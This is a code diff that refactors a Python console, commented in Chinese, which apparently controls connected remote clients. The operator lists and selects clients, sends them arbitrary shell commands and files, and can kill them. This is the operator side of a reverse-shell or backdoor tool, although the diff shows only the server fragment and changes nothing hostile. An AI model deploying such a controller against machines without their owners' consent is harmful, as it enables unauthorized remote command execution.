@@ -20,10 +20,10 @@ def accept_commands():
                 server.socket.close()
                 sys.exit(0)
             elif command == 'list':
-                test_connections()
+                server.test_connections()
                 list_connections()
             elif 'select' in command:
-                test_connections()
+                server.test_connections()
                 connection = None
                 try:
                     connection = server.connections[int(command.replace('select', ''))]
@@ -40,16 +40,6 @@ def accept_commands():
             print('[-] Error: {}'.format(e))
 
 
-# 检查客户端连接
-def test_connections():
-    for conn in server.connections:
-        try:
-            conn.send_command('null', 'null')
-            conn.recv_result()
-        except:
-            server.connections.remove(conn)
-
-
 # 查看已连接客户端列表
 def list_connections():
     for i, connection in enumerate(server.connections):
@@ -59,14 +49,14 @@ def list_connections():
 # 给客户端发送命令
 def open_connection(connection):
     print('[+] Connected to {}'.format(connection.address))
+    connection.send_command('null', 'null')
+    cwd = connection.recv_result()[1]
     while True:
         try:
-            command = input(connection.recv_result()[1] + '> ')
+            command = input(cwd + '> ')
             if not command:
-                connection.send_command('null', 'null')
                 continue
             if command in ['quit', 'exit']:
-                connection.send_command('null', 'null')
                 break
             if command == 'kill':
                 connection.send_command(command)
@@ -77,12 +67,12 @@ def open_connection(connection):
                     connection.send_file(arg)
                 else:
                     print('[-] File does not exist')
-                    connection.send_command('null', 'null')
                     continue
             else:
                 connection.send_command(command)
             status, result = connection.recv_result()
             print(result)
+            cwd = connection.recv_result()[1]
         except ConnectionResetError:
             print('[-] Connection closed')
             break
